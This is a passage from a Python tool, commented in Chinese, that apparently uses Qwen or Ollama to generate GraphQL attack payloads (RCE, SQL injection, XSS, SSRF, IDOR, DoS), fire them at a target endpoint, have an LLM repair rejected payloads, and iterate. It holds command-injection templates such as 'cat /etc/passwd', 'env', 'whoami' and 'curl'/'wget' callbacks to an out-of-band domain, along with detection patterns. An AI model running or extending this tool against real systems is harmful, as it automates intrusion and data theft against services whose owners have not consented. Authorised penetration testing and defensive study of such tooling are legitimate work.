        if response.status_code == 200:
            return response.json().get('response', '')
        else:
            log_error(f"Ollama API 调用失败: {response.status_code}")
            return None

    except requests.RequestException as e:
        log_error(f"Ollama API 调用异常: {e}")
        log_info("请确保 Ollama 正在运行: ollama serve")
        return None


def generate_payloads_with_llm(mutations: list, oast_domain: str, model: str, api_key: str = None, iteration: int = 1, previous_attempts: list = None, queries: list = None, llm_timeout: int = 60) -> Optional[str]:
    """使用 LLM 生成漏洞 Payload（支持智能迭代）"""
    mutations_text = format_mutations_for_llm(mutations, queries)
    prompt = build_llm_prompt(mutations_text, oast_domain, iteration, previous_attempts)

    # 检查是否为 Qwen 系列模型（qwen, qwen-turbo, qwen-plus, qwen-max 等）
    if model.lower().startswith('qwen'):
        if not api_key:
            api_key = os.environ.get('DASHSCOPE_API_KEY')
            if not api_key:
                log_error("请设置 DASHSCOPE_API_KEY 环境变量或使用 --api-key 参数")
                return None
        return call_qwen_api(prompt, api_key, model, timeout=llm_timeout)
    else:
        return call_ollama_api(prompt, model, timeout=llm_timeout)


def analyze_response_with_llm(payload: str, status_code: int, response_text: str, response_time: float, model: str, api_key: str = None) -> str:
    """让 LLM 分析响应，判断是否存在漏洞特征"""

    # 截取响应内容（避免太长）
    response_snippet = response_text[:1000] if response_text else "空响应"

    analysis_prompt = f"""你是一名漏洞分析专家。请分析以下 GraphQL 测试的响应结果：

# 测试 Payload
{payload}

# 响应信息
- HTTP 状态码: {status_code}
- 响应时间: {response_time:.2f} 秒
- 响应内容:
```
{response_snippet}
```

# 分析任务
请简短回答（1-2句话）：
1. 这个响应中是否有漏洞存在的迹象？
2. 如果没有，可能的原因是什么（被过滤、参数错误、不存在漏洞等）？
3. 下一步应该如何调整 Payload？

直接输出分析结论，不要啰嗦：
"""

    # 调用 LLM 分析
    if model.lower().startswith('qwen'):
        if not api_key:
            api_key = os.environ.get('DASHSCOPE_API_KEY')
        if api_key:
            try:
                import dashscope
                from dashscope import Generation
                dashscope.api_key = api_key

                response = Generation.call(
                    model=model if model != 'qwen' else 'qwen-turbo',
                    prompt=analysis_prompt,
                    result_format='text'
                )

                if response.status_code == 200:
                    return response.output.text.strip()
            except:
                pass
    else:
        try:
            response = requests.post(
                "http://localhost:11434/api/generate",
                json={"model": model, "prompt": analysis_prompt, "stream": False},
                timeout=60
            )
            if response.status_code == 200:
                return response.json().get('response', '').strip()
        except:
            pass

    # 如果 LLM 调用失败，返回基础分析
    if status_code >= 500:
        return "服务器错误，可能触发了异常或防护机制"
    elif status_code == 200:
        if response_time > 4:
            return "响应时间异常长，可能存在时间盲注"
        elif 'error' in response_text.lower():
            return "响应包含错误信息，Payload 可能被识别"
        else:
            return "响应正常但无明显漏洞特征，可能需要调整 Payload"
    else:
        return f"HTTP {status_code}，Payload 可能格式不正确或被拒绝"


# =============================================================================
# 漏洞验证
# =============================================================================

def parse_payloads(llm_response: str) -> list:
    """解析 LLM 返回的 Payload"""
    payloads = []
    current_type = None
    current_payload = []

    for line in llm_response.split('\n'):
        line = line.strip()
        if not line:
            if current_payload:
                payloads.append({
                    'type': current_type or 'UNKNOWN',
                    'payload': '\n'.join(current_payload)
                })
                current_payload = []
            continue

        # 检测漏洞类型标记
        if line.startswith('[') and ']' in line:
            if current_payload:
                payloads.append({
                    'type': current_type or 'UNKNOWN',
                    'payload': '\n'.join(current_payload)
                })
                current_payload = []
            current_type = line.split(']')[0].strip('[')
        elif line.startswith('mutation') or line.startswith('query') or line.startswith('{'):
            current_payload.append(line)
        elif current_payload:
            current_payload.append(line)

    if current_payload:
        payloads.append({
            'type': current_type or 'UNKNOWN',
            'payload': '\n'.join(current_payload)
        })

    return payloads


def verify_ssrf(response_text: str, oast_domain: str) -> bool:
    """验证 SSRF（需要手动检查 OAST 平台）"""
    log_info(f"SSRF 验证: 请检查 OAST 平台 ({oast_domain}) 是否有回连")
    return False  # 需要手动验证


def verify_rce(response_time: float, response_text: str = None) -> dict:
    """
    多维度验证 RCE 漏洞

    Returns:
        dict: {
            'vulnerable': bool,
            'method': str,  # 检测方法: time_based, echo_based, output_based
            'details': str  # 详细信息
        }
    """
    result = {'vulnerable': False, 'method': None, 'details': ''}

    # 1. 时间盲注检测（sleep 命令）
    if response_time > 4.0:
        result['vulnerable'] = True
        result['method'] = 'time_based'
        result['details'] = f'响应时间 {response_time:.2f}s，可能存在时间盲注型 RCE'
        return result

    # 2. 回显型 RCE 检测（检查响应中是否包含命令执行结果）
    if response_text:
        response_lower = response_text.lower()

        # 定义回显检测规则：(特征, 描述)
        echo_patterns = [
            # 自定义标记检测（如果 payload 使用了 echo MCP_RCE_xxx）
            ('mcp_rce_', '检测到自定义 RCE 标记'),
            ('graphql_rce_test', '检测到自定义 RCE 标记'),

            # Linux/Unix 命令输出特征
            ('uid=', '检测到 id 命令输出'),
            ('gid=', '检测到 id 命令输出'),
            ('root:', '可能存在 /etc/passwd 泄露'),
            ('/bin/bash', '检测到 shell 路径'),
            ('/bin/sh', '检测到 shell 路径'),
            ('linux', '检测到系统信息'),
            ('gnu/', '检测到 GNU 系统信息'),
            ('darwin', '检测到 macOS 系统信息'),

            # Windows 命令输出特征
            ('windows nt', '检测到 Windows 系统信息'),
            ('microsoft windows', '检测到 Windows 系统信息'),
            ('nt authority', '检测到 Windows 用户信息'),
            ('c:\\windows', '检测到 Windows 路径'),
            ('c:\\users', '检测到 Windows 用户路径'),
            ('administrator', '检测到管理员用户'),

            # 常见命令输出
            ('total ', '可能存在 ls -la 输出'),  # ls -la 输出特征
            ('drwx', '检测到目录权限信息'),
            ('-rwx', '检测到文件权限信息'),
            ('hostname:', '检测到主机名信息'),

            # 网络信息
            ('inet ', '检测到网络接口信息'),
            ('inet6 ', '检测到 IPv6 信息'),
            ('eth0', '检测到网络接口'),
            ('127.0.0.1', '检测到本地回环地址'),

            # 进程信息
            ('pid', '可能存在进程信息'),
            ('ppid', '检测到父进程信息'),
        ]

        for pattern, description in echo_patterns:
            if pattern in response_lower:
                result['vulnerable'] = True
                result['method'] = 'echo_based'
                result['details'] = description
                return result

        # 3. 检测常见用户名（whoami 输出）
        common_users = ['root', 'www-data', 'apache', 'nginx', 'nobody', 'daemon',
                       'mysql', 'postgres', 'node', 'admin', 'user', 'guest',
                       'system', 'administrator', 'iis apppool']
        for user in common_users:
            # 检查是否作为独立单词出现（避免误报）
            import re
            if re.search(rf'\b{re.escape(user)}\b', response_lower):
                # 需要额外验证（避免误报普通文本）
                # 如果响应很短且包含用户名，更可能是命令输出
                if len(response_text) < 500:
                    result['vulnerable'] = True
                    result['method'] = 'output_based'
                    result['details'] = f'检测到可能的用户名输出: {user}'
                    return result

    return result


# RCE 检测 Payload 模板（供 LLM 参考）
RCE_PAYLOAD_TEMPLATES = {
    'time_based': [
        'sleep 5',
        'ping -c 5 127.0.0.1',
        'timeout 5',
        'Start-Sleep -Seconds 5',  # Windows PowerShell
    ],
    'echo_based': [
        'echo MCP_RCE_$(whoami)',
        'echo GRAPHQL_RCE_TEST',
        'echo MCP_RCE_VULNERABLE',
    ],
    'output_based': [
        'whoami',
        'id',
        'hostname',
        'uname -a',
        'cat /etc/passwd',
        'pwd',
        'ls -la',
        'dir',  # Windows
        'ipconfig',  # Windows
        'ifconfig',
        'env',
        'set',  # Windows
    ],
    'oast_based': [
        'curl {oast_domain}',
        'wget {oast_domain}',
        'nslookup {oast_domain}',
        'ping {oast_domain}',
    ]
}


def verify_info_leak(response_text: str) -> list:
    """检测信息泄露"""
    keywords = ['password', 'token', 'secret', 'admin', 'private', 'credential', 'key', 'auth', 'session', 'apikey', 'api_key']
    found = []
    response_lower = response_text.lower()

    for keyword in keywords:
        if keyword in response_lower:
            found.append(keyword)

    return found


def verify_xss(response_text: str, payload: str) -> bool:
    """验证 XSS 漏洞"""
    xss_indicators = [
        '<script', 'alert(', 'onerror=', 'onload=', 'javascript:',
        'eval(', 'document.cookie', '<img', '<iframe'
    ]

    # 检查响应中是否包含 XSS payload 的部分
    for indicator in xss_indicators:
        if indicator.lower() in payload.lower() and indicator.lower() in response_text.lower():
            return True

    return False


def verify_authz_bypass(response_text: str, status_code: int) -> bool:
    """验证未授权访问/权限绕过"""
    # 成功响应且包含敏感数据
    if status_code == 200:
        authz_indicators = ['admin', 'role', 'permission', 'privilege', 'isAdmin', 'superuser']
        for indicator in authz_indicators:
            if indicator in response_text:
                return True

    return False


def verify_idor(response_text: str, status_code: int) -> bool:
    """验证 IDOR（不安全的直接对象引用）"""
    # 如果修改 ID 后仍能访问，可能存在 IDOR
    if status_code == 200 and len(response_text) > 100:
        # 响应包含数据，说明可能访问到了不属于自己的资源
        return True
    return False


def verify_dos(response_time: float) -> bool:
    """验证 DoS（拒绝服务）"""
    # 如果响应时间过长，可能存在资源耗尽攻击
    if response_time > 10:
        return True
    return False


def execute_payload(endpoint: str, payload: str, timeout: int = 10) -> tuple:
    """执行 GraphQL Payload（使用全局会话配置）"""
    # 清理 payload
    payload = payload.strip()
    if not payload.startswith('mutation') and not payload.startswith('query') and not payload.startswith('{'):
        return None, 0, None

    request_kwargs = session_config.get_request_kwargs(timeout)

    try:
        start_time = time.time()
        response = requests.post(
            endpoint,
            json={"query": payload},
            **request_kwargs
        )
        elapsed_time = time.time() - start_time

        return response.text, elapsed_time, response.status_code

    except requests.Timeout:
        elapsed_time = timeout
        return None, elapsed_time, None
    except requests.RequestException as e:
        return None, 0, None


# =============================================================================
# GraphQL 错误分析与自动修复系统
# =============================================================================

def analyze_graphql_error(response_text: str) -> dict:
    """
    分析 GraphQL 错误响应，识别并分类错误类型

    Args:
        response_text: GraphQL 响应文本（可能包含 errors）

    Returns:
        dict: 错误信息字典，包含:
            - has_error: bool, 是否存在错误
            - error_type: str, 错误类型
            - error_message: str, 错误消息
            - field_name: str, 相关字段名
            - suggestions: list, 修复建议
    """
    result = {
        'has_error': False,
        'error_type': 'UNKNOWN',
        'error_message': '',
        'field_name': '',
        'suggestions': []
    }

    if not response_text:
        return result

    try:
        # 尝试解析 JSON 响应
        response_data = json.loads(response_text)

        # 检查是否有 errors 字段
        if 'errors' not in response_data:
            return result

        errors = response_data['errors']
        if not errors:
            return result

        result['has_error'] = True
        error = errors[0]  # 分析第一个错误
        error_msg = error.get('message', '').lower()
        result['error_message'] = error.get('message', '')

        # 分类常见的 GraphQL 错误类型

        # 1. 子选择错误 - Field 'xxx' must have a sub selection
        if 'must have a sub selection' in error_msg or 'sub selection' in error_msg:
            result['error_type'] = 'SUBSELECTION_REQUIRED'
            # 提取字段名（从原始消息中提取以保持大小写）
            import re
            original_msg = error.get('message', '')
            field_match = re.search(r"field '(\w+)'", original_msg, re.IGNORECASE)
            if field_match:
                result['field_name'] = field_match.group(1)
            result['suggestions'] = [
                '为该字段添加子字段选择，例如: { fieldName { id } }',
                '如果该字段不需要子字段，检查 Schema 定义'
            ]

        # 2. 未知字段错误 - Cannot query field "xxx"
        elif 'cannot query field' in error_msg or 'unknown field' in error_msg:
            result['error_type'] = 'UNKNOWN_FIELD'
            import re
            original_msg = error.get('message', '')
            field_match = re.search(r'["\'](\w+)["\']', original_msg)
            if field_match:
                result['field_name'] = field_match.group(1)
            result['suggestions'] = [
                '检查字段名拼写是否正确',
                '确认该字段存在于当前 Schema 中',
                '尝试使用内省查询查看可用字段'
            ]

        # 3. 参数错误 - Unknown argument / Required argument
        elif 'unknown argument' in error_msg or 'required' in error_msg:
            result['error_type'] = 'INVALID_ARGUMENT'
            import re
            original_msg = error.get('message', '')
            arg_match = re.search(r'argument\s+[\'"](\w+)[\'"]', original_msg, re.IGNORECASE)
            if arg_match:
                result['field_name'] = arg_match.group(1)
            result['suggestions'] = [
                '检查参数名是否正确',
                '添加必需的参数',
                '检查参数类型是否匹配'
            ]

        # 4. 类型错误 - String cannot represent value / Expected type
        elif 'cannot represent' in error_msg or 'expected type' in error_msg:
            result['error_type'] = 'TYPE_MISMATCH'
            result['suggestions'] = [
                '检查参数值类型（String、Int、Boolean 等）',
                '字符串值需要用引号包裹',
                'Int 类型不应使用引号'
            ]

        # 5. 语法错误 - Syntax Error
        elif 'syntax' in error_msg:
            result['error_type'] = 'SYNTAX_ERROR'
            result['suggestions'] = [
                '检查 GraphQL 语法是否正确',
                '确保括号、花括号匹配',
                '检查逗号和冒号的使用'
            ]

        # 6. 查询深度限制
        elif 'depth' in error_msg and 'exceed' in error_msg:
            result['error_type'] = 'DEPTH_LIMIT'
            result['suggestions'] = [
                '减少查询嵌套层级',
                '使用分页而不是深度嵌套'
            ]

        # 7. 鉴权/权限错误
        elif 'authorization' in error_msg or 'authentication' in error_msg or 'permission' in error_msg:
            result['error_type'] = 'AUTH_ERROR'
            result['suggestions'] = [
                '提供认证令牌',
                '检查用户权限'
            ]

        else:
            # 通用错误
            result['error_type'] = 'GENERAL_ERROR'
            result['suggestions'] = ['使用 LLM 分析此错误']

    except json.JSONDecodeError:
        # 响应不是有效的 JSON
        result['has_error'] = True
        result['error_type'] = 'INVALID_RESPONSE'
        result['error_message'] = '响应不是有效的 JSON'
        result['suggestions'] = ['检查端点是否返回 GraphQL 响应']

    except Exception as e:
        result['has_error'] = True
        result['error_type'] = 'ANALYSIS_ERROR'
        result['error_message'] = f'错误分析失败: {str(e)}'

    return result


def fix_subselection_payload(payload: str, field_name: str) -> str:
    """
    修复子选择缺失错误 - 为字段添加 __typename 作为安全的子选择

    Args:
        payload: 原始 Payload
        field_name: 需要添加子选择的字段名

    Returns:
        str: 修复后的 Payload
    """
    import re

    # 查找字段名后面跟着的内容，添加 { __typename }
    # 模式1: fieldName) } - 在括号后添加子选择
    pattern1 = rf'({field_name}\s*\([^)]*\))\s*\}}'
    if re.search(pattern1, payload):
        return re.sub(pattern1, r'\1 { __typename } }', payload)

    # 模式2: fieldName { 已有子选择但可能不完整
    pattern2 = rf'({field_name}\s*(?:\([^)]*\))?\s*)\{{\s*\}}'
    if re.search(pattern2, payload):
        return re.sub(pattern2, r'\1{ __typename }', payload)

    # 模式3: fieldName 后面直接是 } - 需要添加子选择
    pattern3 = rf'({field_name})\s*\}}'
    if re.search(pattern3, payload):
        return re.sub(pattern3, r'\1 { __typename } }', payload)

    # 默认：在字段名后添加 { __typename }
    pattern4 = rf'({field_name}\s*(?:\([^)]*\))?)'
    return re.sub(pattern4, r'\1 { __typename }', payload, count=1)


def fix_unknown_field_payload(payload: str, field_name: str) -> str:
    """
    修复未知字段错误 - 移除或注释该字段

    Args:
        payload: 原始 Payload
        field_name: 未知的字段名

    Returns:
        str: 修复后的 Payload
    """
    import re

    # 移除包含该字段的行
    lines = payload.split('\n')
    fixed_lines = []

    for line in lines:
        # 跳过包含未知字段的行
        if field_name in line and ('{' in line or ':' in line or '(' in line):
            continue
        fixed_lines.append(line)

    return '\n'.join(fixed_lines)


def fix_syntax_payload(payload: str) -> str:
    """
    尝试修复语法错误

    Args:
        payload: 原始 Payload

    Returns:
        str: 修复后的 Payload
    """
    import re

    # 清理多余的空格和换行
    fixed = re.sub(r'\s+', ' ', payload.strip())

    # 确保操作类型后有花括号
    if 'mutation ' in fixed or 'query ' in fixed:
        # 在操作名和第一个 { 之间添加 { 如果缺失
        fixed = re.sub(r'(mutation|query)\s+(\w+)\s+', r'\1 \2 { ', fixed, count=1)

    # 移除尾随逗号
    fixed = re.sub(r',(\s*[}\]])', r'\1', fixed)

    return fixed


def auto_fix_payload(payload: str, error_info: dict) -> tuple:
    """
    根据 GraphQL 错误信息自动修复 Payload

    Args:
        payload: 原始 Payload
        error_info: analyze_graphql_error 返回的错误信息

    Returns:
        tuple: (fixed_payload: str, success: bool, message: str)
    """
    if not error_info['has_error']:
        return payload, False, '没有错误需要修复'

    error_type = error_info['error_type']
    field_name = error_info.get('field_name', '')

    try:
        if error_type == 'SUBSELECTION_REQUIRED':
            if field_name:
                fixed = fix_subselection_payload(payload, field_name)
                return fixed, True, f'为字段 {field_name} 添加了子选择'

        elif error_type == 'UNKNOWN_FIELD':
            if field_name:
                fixed = fix_unknown_field_payload(payload, field_name)
                return fixed, True, f'移除了未知字段 {field_name}'

        elif error_type == 'SYNTAX_ERROR':
            fixed = fix_syntax_payload(payload)
            return fixed, True, '尝试修复语法错误'

        elif error_type == 'TYPE_MISMATCH':
            # 类型错误较难自动修复，返回原 payload
            return payload, False, '类型错误需要人工检查或 LLM 修复'

        else:
            return payload, False, f'错误类型 {error_type} 无法自动修复'

    except Exception as e:
        return payload, False, f'自动修复失败: {str(e)}'

    return payload, False, '无法自动修复此错误'


def retry_with_llm(original_payload: str, error_info: dict, endpoint: str,
                   model: str, api_key: str = None) -> tuple:
    """
    使用 LLM 修复复杂的 GraphQL 错误

    Args:
        original_payload: 原始 Payload
        error_info: analyze_graphql_error 返回的错误信息
        endpoint: GraphQL 端点（用于上下文）
        model: LLM 模型名称
        api_key: API Key（如果需要）

    Returns:
        tuple: (fixed_payload: str, success: bool, message: str)
    """
    error_msg = error_info.get('error_message', '未知错误')
    error_type = error_info.get('error_type', 'UNKNOWN')
    suggestions = error_info.get('suggestions', [])

    prompt = f"""你是一名 GraphQL 专家。请修复以下 GraphQL Payload 中的错误。

# 原始 Payload
```graphql
{original_payload}
```

# 错误信息
- 错误类型: {error_type}
- 错误消息: {error_msg}
- 修复建议: {', '.join(suggestions) if suggestions else '无'}

# 修复要求
1. 只输出修复后的 GraphQL Payload，不要解释
2. 确保 Payload 语法正确
3. 根据 GraphQL 最佳实践修复错误
4. 如果字段不存在，尝试替换为相似的常见字段名
5. 保持原始意图不变

修复后的 Payload:"""

    log_info("  🤖 调用 LLM 修复 Payload 错误...")

    try:
        # 调用 LLM
        if model.lower().startswith('qwen'):
            if not api_key:
                api_key = os.environ.get('DASHSCOPE_API_KEY')
            if api_key:
                try:
                    import dashscope
                    from dashscope import Generation
                    dashscope.api_key = api_key

                    response = Generation.call(
                        model=model if model != 'qwen' else 'qwen-turbo',
                        prompt=prompt,
                        result_format='text'
                    )

                    if response.status_code == 200:
                        fixed_payload = response.output.text.strip()
                        # 提取 GraphQL payload（移除可能的 markdown 代码块标记）
                        import re
                        payload_match = re.search(r'(?:mutation|query|{)[^{]*{.*}', fixed_payload, re.DOTALL)
                        if payload_match:
                            fixed_payload = payload_match.group(0).strip()

                        return fixed_payload, True, 'LLM 修复成功'

                except Exception as e:
                    return original_payload, False, f'LLM 调用失败: {str(e)}'

        else:
            # Ollama
            try:
                response = requests.post(
                    "http://localhost:11434/api/generate",
                    json={"model": model, "prompt": prompt, "stream": False},
                    timeout=60
                )
                if response.status_code == 200:
                    fixed_payload = response.json().get('response', '').strip()
                    # 提取 GraphQL payload
                    import re
                    payload_match = re.search(r'(?:mutation|query|{)[^{]*{.*}', fixed_payload, re.DOTALL)
                    if payload_match:
                        fixed_payload = payload_match.group(0).strip()

                    return fixed_payload, True, 'LLM 修复成功'

            except Exception as e:
                return original_payload, False, f'Ollama 调用失败: {str(e)}'

    except Exception as e:
        return original_payload, False, f'LLM 修复异常: {str(e)}'

    return original_payload, False, 'LLM 修复失败'


def test_payload(endpoint: str, payload: str, timeout: int = 10,
                model: str = None, api_key: str = None, max_retries: int = 2) -> dict:
    """
    测试 Payload，带自动重试和错误修复机制

    工作流程:
    1. 发送初始 Payload
    2. 如果收到 GraphQL 错误，尝试自动修复
    3. 如果自动修复失败，使用 LLM 修复
    4. 最多重试 max_retries 次

    Args:
        endpoint: GraphQL 端点
        payload: 要测试的 Payload
        timeout: 请求超时时间
        model: LLM 模型（用于复杂修复）
        api_key: API Key
        max_retries: 最大重试次数

    Returns:
        dict: 测试结果，包含:
            - success: bool, 最终是否成功
            - payload: str, 最终使用的 Payload
            - response_text: str, 响应内容
            - response_time: float, 响应时间
            - status_code: int, HTTP 状态码
            - attempts: list, 每次尝试的记录
            - error_fixed: bool, 是否修复了错误
            - fix_method: str, 修复方法（'auto_fix' 或 'llm_fix' 或 'none'）
    """
    attempts = []
    current_payload = payload
    error_fixed = False
    fix_method = 'none'

    for attempt in range(max_retries + 1):
        # 发送 Payload
        response_text, elapsed_time, status_code = execute_payload(endpoint, current_payload, timeout)

        attempt_info = {
            'attempt': attempt + 1,
            'payload': current_payload,
            'response_text': response_text,
            'response_time': elapsed_time,
            'status_code': status_code
        }
        attempts.append(attempt_info)

        # 如果响应为空且未超时，可能是网络问题，不再重试
        if not response_text and elapsed_time < timeout:
            return {
                'success': False,
                'payload': current_payload,
                'response_text': response_text,
                'response_time': elapsed_time,
                'status_code': status_code,
                'attempts': attempts,
                'error_fixed': error_fixed,
                'fix_method': fix_method,
                'message': '请求失败，可能是网络问题'
            }

        # 分析响应中的错误
        if response_text:
            error_info = analyze_graphql_error(response_text)
        else:
            error_info = {'has_error': False}

        # 如果没有错误，返回成功
        if not error_info['has_error']:
            return {
                'success': True,
                'payload': current_payload,
                'response_text': response_text,
                'response_time': elapsed_time,
                'status_code': status_code,
                'attempts': attempts,
                'error_fixed': error_fixed,
                'fix_method': fix_method,
                'message': 'Payload 执行成功'
            }

        # 如果有错误且还有重试次数
        if attempt < max_retries:
            log_info(f"  🔄 检测到错误，尝试修复 (重试 {attempt + 1}/{max_retries})...")
            log_info(f"     错误: {error_info['error_type']} - {error_info.get('error_message', '')[:80]}")

            # 第一次尝试：自动修复
            if attempt == 0:
                fixed_payload, success, message = auto_fix_payload(current_payload, error_info)
                if success:
                    current_payload = fixed_payload
                    error_fixed = True
                    fix_method = 'auto_fix'
                    log_info(f"  ✅ 自动修复: {message}")
                    continue

            # 第二次尝试：LLM 修复
            if attempt == 1 and model:
                fixed_payload, success, message = retry_with_llm(current_payload, error_info, endpoint, model, api_key)
                if success:
                    current_payload = fixed_payload
                    error_fixed = True
                    fix_method = 'llm_fix'
                    log_info(f"  ✅ LLM 修复: {message}")
                    continue

            log_warning(f"  ⚠️  无法自动修复，使用原始 Payload")

    # 所有重试都失败
    return {
        'success': False,
        'payload': current_payload,
        'response_text': response_text,
        'response_time': elapsed_time,
        'status_code': status_code,
        'attempts': attempts,
        'error_fixed': error_fixed,
        'fix_method': fix_method,
        'message': f'达到最大重试次数 ({max_retries})，仍有错误'
    }


# =============================================================================
# 智能 Fuzzing 系统
# =============================================================================

def intelligent_fuzzing(endpoint: str, mutations: list, oast_domain: str, model: str, api_key: str,
                       timeout: int = 10, max_iterations: int = 3, queries: list = None, llm_timeout: int = 60) -> list:
    """
    智能 Fuzzing 系统：AI 驱动的迭代式漏洞测试

    核心思想：
    1. 生成初始 Payloads（基于 Mutations 和/或 Queries）
    2. 发送并记录响应
    3. AI 分析响应
    4. 根据分析生成新的 Payloads
    5. 重复 2-4，直到找到漏洞或达到最大迭代次数
    """
    print(f"\n{Colors.CYAN}{'='*60}")
    print(f"🧠 智能 AI Fuzzing 模式 (最多 {max_iterations} 轮迭代)")
    print(f"{'='*60}{Colors.RESET}\n")

    all_results = []
    previous_attempts = []

    for iteration in range(1, max_iterations + 1):
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'━'*60}")
        print(f"第 {iteration} 轮 Fuzzing")
        print(f"{'━'*60}{Colors.RESET}\n")

        # 1. 生成 Payload（第1轮是初始，后续轮次会参考之前的尝试）
        if iteration == 1:
            log_info("生成初始 Payloads...")
        else:
            log_info(f"基于前 {len(previous_attempts)} 次尝试的响应分析，生成优化 Payloads...")

        llm_response = generate_payloads_with_llm(
            mutations,
            oast_domain,
            model,
            api_key,
            iteration=iteration,
            previous_attempts=previous_attempts,
            queries=queries,
            llm_timeout=llm_timeout
        )

        if not llm_response:
            log_error(f"第 {iteration} 轮 Payload 生成失败")
            break

        # 2. 解析 Payload
        payloads = parse_payloads(llm_response)
        if not payloads:
            log_warning(f"第 {iteration} 轮未能解析出有效 Payload")
            break

        log_success(f"生成 {len(payloads)} 个 Payloads")

        # 3. 测试每个 Payload
        iteration_found_vulns = False

        for i, payload_info in enumerate(payloads):
            vuln_type = payload_info['type']
            payload = payload_info['payload']

            print(f"\n  {Colors.BLUE}[Payload #{i+1}/{len(payloads)}] {vuln_type}{Colors.RESET}")
            print(f"  {Colors.WHITE}{payload[:150]}...{Colors.RESET}" if len(payload) > 150 else f"  {Colors.WHITE}{payload}{Colors.RESET}")

            # 使用 test_payload 发送 Payload（带自动错误修复和重试）
            test_result = test_payload(
                endpoint=endpoint,
                payload=payload,
                timeout=timeout,
                model=model,
                api_key=api_key,
                max_retries=2
            )

            response_text = test_result['response_text']
            elapsed_time = test_result['response_time']
            status_code = test_result['status_code']

            # 记录错误修复信息
            if test_result['error_fixed']:
                fix_info = f"修复方法: {test_result['fix_method']}"
                if test_result['fix_method'] == 'auto_fix':
                    log_info(f"  🔧 自动修复已应用")
                elif test_result['fix_method'] == 'llm_fix':
                    log_info(f"  🤖 LLM 修复已应用")

            result = {
                'round': iteration,
                'type': vuln_type,
                'payload': test_result['payload'],  # 使用最终（可能被修复）的 payload
                'original_payload': payload,  # 保存原始 payload
                'status_code': status_code,
                'response_time': elapsed_time,
                'vulnerable': False,
                'details': '',
                'response_snippet': (response_text[:500] if response_text else '空响应'),
                'analysis': '',
                'error_fixed': test_result['error_fixed'],
                'fix_method': test_result['fix_method'],
                'attempts': test_result.get('attempts', [])
            }

            if not test_result['success'] and not response_text and elapsed_time < timeout:
                log_error("  ❌ 请求失败")
                result['analysis'] = "请求失败，可能是网络问题或 Payload 格式错误"
                previous_attempts.append(result)
                continue

            # 4. AI 分析响应
            log_info("  🤔 AI 正在分析响应...")
            analysis = analyze_response_with_llm(payload, status_code or 0, response_text or '', elapsed_time, model, api_key)
            result['analysis'] = analysis

            print(f"  {Colors.CYAN}💡 分析: {analysis}{Colors.RESET}")

            # 5. 多维度漏洞验证
            vuln_detected = False

            # RCE 验证（支持时间盲注和回显检测）
            if 'RCE' in vuln_type.upper() or 'CMD' in vuln_type.upper():
                rce_result = verify_rce(elapsed_time, response_text)
                if rce_result['vulnerable']:
                    result['vulnerable'] = True
                    result['details'] = rce_result['details']
                    log_vuln("RCE", f"[{rce_result['method']}] {rce_result['details']}")
                    vuln_detected = True

            # SQL 注入验证
            if 'SQL' in vuln_type.upper() and response_text:
                sql_indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'sqlite', 'query', 'database']
                if any(ind in response_text.lower() for ind in sql_indicators):
                    result['vulnerable'] = True
                    result['details'] = "响应包含 SQL 错误信息"
                    log_vuln("SQLi", "检测到 SQL 错误信息！")
                    vuln_detected = True

            # XSS 验证
            if 'XSS' in vuln_type.upper() and response_text:
                if verify_xss(response_text, payload):
                    result['vulnerable'] = True
                    result['details'] = "响应中反射了 XSS Payload"
                    log_vuln("XSS", "检测到 XSS 漏洞！")
                    vuln_detected = True

            # 未授权访问验证
            if 'AUTHZ' in vuln_type.upper() and response_text:
                if verify_authz_bypass(response_text, status_code or 0):
                    result['vulnerable'] = True
                    result['details'] = "可能存在权限绕过"
                    log_vuln("AUTHZ", "检测到未授权访问！")
                    vuln_detected = True

            # IDOR 验证
            if 'IDOR' in vuln_type.upper() and response_text:
                if verify_idor(response_text, status_code or 0):
                    result['vulnerable'] = True
                    result['details'] = "可能存在 IDOR"
                    log_vuln("IDOR", "检测到不安全的直接对象引用！")
                    vuln_detected = True

            # 信息泄露验证
            if response_text:
                leaked_info = verify_info_leak(response_text)
                if leaked_info:
                    result['vulnerable'] = True
                    result['details'] = f"发现敏感关键词: {', '.join(leaked_info)}"
                    log_vuln("INFO_LEAK", f"发现敏感信息泄露: {', '.join(leaked_info)}")
                    vuln_detected = True

            # DoS 验证
            if 'DOS' in vuln_type.upper():
                if verify_dos(elapsed_time):
                    result['vulnerable'] = True
                    result['details'] = f"响应时间 {elapsed_time:.2f}s，可能存在资源耗尽"
                    log_vuln("DOS", "检测到拒绝服务漏洞！")
                    vuln_detected = True

            # SSRF 提示
            if 'SSRF' in vuln_type.upper():
                if status_code == 200:
                    result['details'] = f"请检查 OAST 平台 ({oast_domain}) 是否有回连"
                    log_warning(f"  ⚠️  SSRF Payload 已发送，请手动检查 OAST 平台")

            print(f"  📊 HTTP {status_code} | ⏱️  {elapsed_time:.2f}s")

            if vuln_detected:
                iteration_found_vulns = True

            all_results.append(result)
            previous_attempts.append(result)

        # 如果本轮找到了漏洞，并且不是最后一轮，询问是否继续
        if iteration_found_vulns and iteration < max_iterations:
            log_success(f"✅ 第 {iteration} 轮发现漏洞！")
            print(f"{Colors.YELLOW}  AI 将在下一轮尝试发现更多漏洞...{Colors.RESET}\n")
        elif iteration == max_iterations:
            log_info(f"已达到最大迭代次数 ({max_iterations} 轮)")
        else:
            print(f"{Colors.YELLOW}  本轮未发现明显漏洞，AI 将调整策略继续尝试{Colors.RESET}\n")

    return all_results


def run_vulnerability_verification(endpoint: str, payloads: list, oast_domain: str, timeout: int = 10) -> list:
    """执行漏洞验证"""
    results = []

    print(f"\n{Colors.CYAN}{'='*60}")
    print(f"漏洞验证")
    print(f"{'='*60}{Colors.RESET}\n")

    for i, payload_info in enumerate(payloads):
        vuln_type = payload_info['type']
        payload = payload_info['payload']

        log_info(f"测试 Payload #{i+1} [{vuln_type}]")
        print(f"  {Colors.WHITE}{payload[:100]}...{Colors.RESET}" if len(payload) > 100 else f"  {Colors.WHITE}{payload}{Colors.RESET}")

        response_text, elapsed_time, status_code = execute_payload(endpoint, payload, timeout)

        result = {
            'type': vuln_type,
            'payload': payload,
            'status_code': status_code,
            'response_time': elapsed_time,
            'vulnerable': False,
            'details': ''
        }

        if response_text is None:
            if elapsed_time >= timeout:
                log_warning(f"  请求超时 (>{timeout}s) - 可能存在时间盲注")
                if 'RCE' in vuln_type.upper() or 'CMD' in vuln_type.upper():
                    result['vulnerable'] = True
                    result['details'] = f"响应超时 ({elapsed_time:.2f}s)，可能存在命令注入"
                    log_vuln("RCE", f"响应超时，可能存在命令注入!")
            else:
